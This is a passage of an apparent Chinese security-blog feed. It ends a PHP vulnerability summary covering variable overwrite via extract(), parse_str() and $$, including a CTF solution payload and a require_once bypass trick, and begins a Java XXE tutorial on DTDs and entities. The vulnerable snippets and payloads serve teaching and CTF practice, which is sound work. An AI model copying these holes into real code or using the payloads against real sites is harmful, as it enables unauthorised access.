EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><ul><li>$flags：默认为 <code>EXTR_OVERWRITE</code>，如果有冲突，覆盖已有的变量。<code>EXTR_SKIP</code> 如果有冲突，不覆盖已有的变量。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"0"</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>防御方法：在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖，<code>extract($_GET,EXTR_SKIP);</code></p><h3 id="8-3-parse-str"><a href="#8-3-parse-str" class="headerlink" title="8.3 parse_str()"></a>8.3 parse_str()</h3><p>parse_str()函数通常用于解析URL中的querystring，把查询字符串解析到变量中。</p><p><strong>函数定义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><ul><li>$result：设置了这个参数，变量将会以数组元素的形式存入到这个数组，作为替代。如果没有设置，则由该函数设置的变量将覆盖已存在的同名变量。</li></ul><p><strong>注意：在 PHP 7.2 中将<em>废弃</em>不设置参数的行为</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=mi1k7ea</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'oop'</span>;</span><br><span class="line">parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">'mi1k7ea'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-4-mb-parse-str"><a href="#8-4-mb-parse-str" class="headerlink" title="8.4 mb_parse_str()"></a>8.4 mb_parse_str()</h3><p>mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'oop'</span>;</span><br><span class="line">mb_parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">'mi1k7ea'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-5-import-request-variables"><a href="#8-5-import-request-variables" class="headerlink" title="8.5 import_request_variables()"></a>8.5 import_request_variables()</h3><p>(PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</p><p>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</p><p><strong>函数定义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>types：可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"0"</span>;</span><br><span class="line">import_request_variables(<span class="string">"G"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Fucked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Nothing!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-6-导致的变量覆盖"><a href="#8-6-导致的变量覆盖" class="headerlink" title="8.6 $$导致的变量覆盖"></a>8.6 $$导致的变量覆盖</h3><p>$$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;    <span class="comment">//hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $hello"</span>;   <span class="comment">//hello world</span></span><br></pre></td></tr></table></figure><p>即 <code>${$a}</code> 就代表 <code>$hello</code></p><p>变量覆盖常在 foreach 语句中出现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p…"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )&#123;</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">$$key = $$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )&#123;</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?_200-=flag</code> ，post 数据 <code>flag=1</code> ，这里注意两个 foreach 语句的不同，第一个为 <code>$$value</code>，第二个为 <code>$value</code> 。<code>?_200-=flag</code> 先将 flag 变量的值覆盖到 _200 变量，然后<code>flag=1</code> 将 flag 变量值覆盖掉，使 post 的 flag 和 flag 变量的值相等。</p><h3 id="8-7-变量覆盖防御"><a href="#8-7-变量覆盖防御" class="headerlink" title="8.7 变量覆盖防御"></a>8.7 变量覆盖防御</h3><ol><li>尽量使用原始变量数组</li><li>注册变量前判断变量是否存在，比如 <code>extract()</code> 的 <code>EXTR_SKIP</code> 模式</li></ol><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9 文件包含"></a>9 文件包含</h2><p>在 php.ini 中，allow_url_fopen 默认一直是On，而 allow_url_include 从 php5.2 之后就默认为 Off</p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854852&idx=1&sn=0154f9bc04d0eccf7069c4a70a55edef&chksm=bd5926898a2eaf9fd700b394150a34ce46b663f8cc018015559d99517aae8cdb2d2d1c687d95&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（一）</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854862&idx=1&sn=cad6b970d2a7837358e1a29dc5b661b5&chksm=bd5926838a2eaf95f0f228164ee4d56455ae00ef14667eb4c3250ec63bab84aac26c407b6dcf&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（二）</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854950&idx=1&sn=b04867a22cdef2fb7ce7a3c6ccad2985&chksm=bd59266b8a2eaf7d99d12dc18c19929f0765cf8b461b4b54271b22657232bda9d28e69fb698e&scene=21#wechat_redirect" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（三）</a></p><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1598430966&ver=2545&signature=*gkExg6A061lOVJaSygcHg5kKE9y6D5HM4i1*uXCZamHlF-Vq3-84K0eORDpsJzDrCq7QrFxqI1fNupmHrRZBRYufy*HKwK*SEqO*-qCAtN*T5gfY3zg2jV988HZgN0z&new=1" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（完结）</a></p><h3 id="9-1-绕过-require-once-单次包含限制"><a href="#9-1-绕过-require-once-单次包含限制" class="headerlink" title="9.1 绕过 require_once 单次包含限制"></a>9.1 绕过 require_once 单次包含限制</h3><p>仅 Linux 环境下，<code>/proc/self/root/</code> 是指向 <code>/</code> 的符号链接，<code>/proc/self/root/</code> 多级符号链接(41次+)可绕过限制</p><p><a href="https://www.anquanke.com/post/id/213235" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://flag0.com/2019/09/20/php弱类型/" target="_blank" rel="noopener">php弱类型 - flag0</a></li><li><a href="https://www.fuzzer.xyz/2019/03/13/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1(%E4%B8%8A)/" target="_blank" rel="noopener">php代码审计之函数漏洞审计(上) - Ethan</a></li><li><a href="https://www.fuzzer.xyz/2019/03/13/php代码审计之函数漏洞审计(下)/" target="_blank" rel="noopener">php代码审计之函数漏洞审计(下) - Ethan</a></li><li><a href="https://www.mi1k7ea.com/2019/06/20/PHP变量覆盖漏洞/" target="_blank" rel="noopener">PHP变量覆盖漏洞 - mi1k7ea</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要针对 PHP 函数相关的漏洞的总结，可能会偏向 CTF 方面，内容肯定不全，有空的话会持续更新，欢迎各位表哥补充以及对文章错误之处进行斧正！&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="PHP" scheme="https://jlkl.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java XXE 漏洞</title>
    <link href="https://jlkl.github.io/2020/08/24/Java_03/"/>
    <id>https://jlkl.github.io/2020/08/24/Java_03/</id>
    <published>2020-08-24T11:47:41.000Z</published>
    <updated>2020-08-24T11:59:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-XML-基础"><a href="#1-XML-基础" class="headerlink" title="1 XML 基础"></a>1 XML 基础</h2><p>XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据</p><h3 id="1-1-XML文档结构"><a href="#1-1-XML文档结构" class="headerlink" title="1.1 XML文档结构"></a>1.1 XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-DTD"><a href="#1-2-DTD" class="headerlink" title="1.2 DTD"></a>1.2 DTD</h3><p>DTD(文档类型定义，Document Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><p><strong>DTD引用方式</strong></p><p>1）DTD 内部声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><p>2）DTD 外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"外部DTD的URI"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3）引用公共DTD</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"DTD标识名"</span> <span class="meta-string">"公用DTD的URI"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD 关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li><li>ELEMENT（定义元素声明）</li></ul><p><strong>PCDATA</strong></p><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。<br>文本中的标签会被当作标记来处理，而实体会被展开。<br>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><p><strong>CDATA</strong></p><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="1-3-实体分类"><a href="#1-3-实体分类" class="headerlink" title="1.3 实体分类"></a>1.3 实体分类</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体/普通实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></p><h4 id="1-3-1-内置实体-Built-in-entities"><a href="#1-3-1-内置实体-Built-in-entities" class="headerlink" title="1.3.1 内置实体 (Built-in entities)"></a>1.3.1 内置实体 (Built-in entities)</h4><ul><li>&amp;符号: <code>&amp;amp</code>;</li><li>单引号: <code>&amp;apos</code>;</li><li>＞: <code>&amp;gt</code>;</li><li>＜: <code>&amp;lt</code>;</li><li>双引号: <code>&amp;quot</code>;</li></ul><h4 id="1-3-2-字符实体-Character-entities"><a href="#1-3-2-字符实体-Character-entities" class="headerlink" title="1.3.2 字符实体 (Character entities)"></a>1.3.2 字符实体 (Character entities)</h4><p>通常是 html 的实体编码，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8" standalone = "yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">author</span>[</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ELEMENT <span class="meta-keyword">author</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"&amp;#169;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&amp;#169</code> 即 <code>©</code></p><h4 id="1-3-3-普通实体-General-entities"><a href="#1-3-3-普通实体-General-entities" class="headerlink" title="1.3.3 普通实体 (General entities)"></a>1.3.3 普通实体 (General entities)</h4><p>简单理解即引用替换，语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">ename</span> <span class="meta-string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Example：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">source-text</span> <span class="meta-string">"tutorialspoint"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">   &amp;source-text;</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-3-4-参数实体-Parameter-entities"><a href="#1-3-4-参数实体-Parameter-entities" class="headerlink" title="1.3.4 参数实体 (Parameter entities)"></a>1.3.4 参数实体 (Parameter entities)</h4><p>参数实体的目的是创建动态替换的文本节</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><em>entity_value</em> 可以是除 <code>&amp;</code>, <code>%</code> 或 <code>&quot;</code> 外所有字符</li></ul><p>test323.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"test323.dtd"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test323.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY % name &quot;(#PCDATA)&quot;&gt;  </span><br><span class="line">&lt;!ELEMENT addr %name;&gt;  </span><br><span class="line">&lt;!ELEMENT tel %name;&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email %name;&gt;</span><br></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h3 id="1-4-内部实体和外部实体"><a href="#1-4-内部实体和外部实体" class="headerlink" title="1.4 内部实体和外部实体"></a>1.4 内部实体和外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的声明方式。</p><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="1-5-通用实体和参数实体"><a href="#1-5-通用实体和参数实体" class="headerlink" title="1.5 通用实体和参数实体"></a>1.5 通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p><p><strong>通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>参数实体</strong></p><ol><li>使用 <code>% 实体名</code> (这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</li><li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li><li>和通用实体一样，参数实体也可以外部引用</li></ol><h4 id="1-5-1-内部通用实体"><a href="#1-5-1-内部通用实体" class="headerlink" title="1.5.1 内部通用实体"></a>1.5.1 内部通用实体</h4><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>Example：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure><h4 id="1-5-2-外部通用实体"><a href="#1-5-2-外部通用实体" class="headerlink" title="1.5.2 外部通用实体"></a>1.5.2 外部通用实体</h4><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>Example：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;entities.dtd&quot;&gt;</span><br><span 